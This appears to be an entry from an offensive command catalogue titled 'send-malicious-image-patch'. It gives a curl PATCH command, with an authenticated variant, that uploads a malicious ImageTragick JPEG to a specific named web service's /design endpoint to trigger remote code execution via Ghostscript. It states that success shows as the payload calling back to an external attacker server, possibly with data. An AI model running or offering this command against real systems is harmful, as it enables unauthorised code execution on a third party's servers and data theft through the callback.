---
data: >-
  curl -X PATCH https://manage.booth.pm/design -F
  "shop[header]=@imagetragick.jpeg"
tags:
  - rce
  - http
  - upload
type: command
output: >-
  HTTP response indicating successful upload, e.g., 200 OK; RCE confirmed via
  external callback
executor: bash
platforms:
  - Linux
  - Web
id: 7dbe4890-57de-4264-a137-ca88dd8ece29
created_at: '2025-12-14T17:23:49.530Z'
updated_at: '2025-12-14T17:23:49.530Z'
verified: false
validated: true
submitted: true
---
# send-malicious-image-patch

## Command

```bash
curl -X PATCH https://manage.booth.pm/design -F "shop[header]=@imagetragick.jpeg"
```

## Description

This command sends a multipart/form-data PATCH request to upload a malicious JPEG file to the /design endpoint, exploiting ImageTragick v2 to trigger RCE via Ghostscript processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PATCH` | Specifies the HTTP method as PATCH | Yes |
| `https://manage.booth.pm/design` | Target endpoint URL | Yes |
| `-F "shop[header]=@imagetragick.jpeg"` | Form field for image upload, referencing the local malicious file | Yes |

## Examples

### Basic Usage

```bash
curl -X PATCH https://manage.booth.pm/design -F "shop[header]=@imagetragick.jpeg"
```

### Advanced Usage

```bash
curl -X PATCH -H "Authorization: Bearer token" https://manage.booth.pm/design -F "shop[header]=@imagetragick.jpeg" -v
```

> Adds verbose output and auth header if required.

## Expected Output

A successful HTTP response (e.g., 200 OK or 204 No Content) from the server acknowledging the upload. The actual RCE occurs server-side, visible via the embedded curl hitting the attacker's server (e.g., GET request to https://avtohanter.ru/qwetest with potential data payload).

## Related

- [[Related Procedure: Exploit-ImageTragick-v2-for-RCE]]
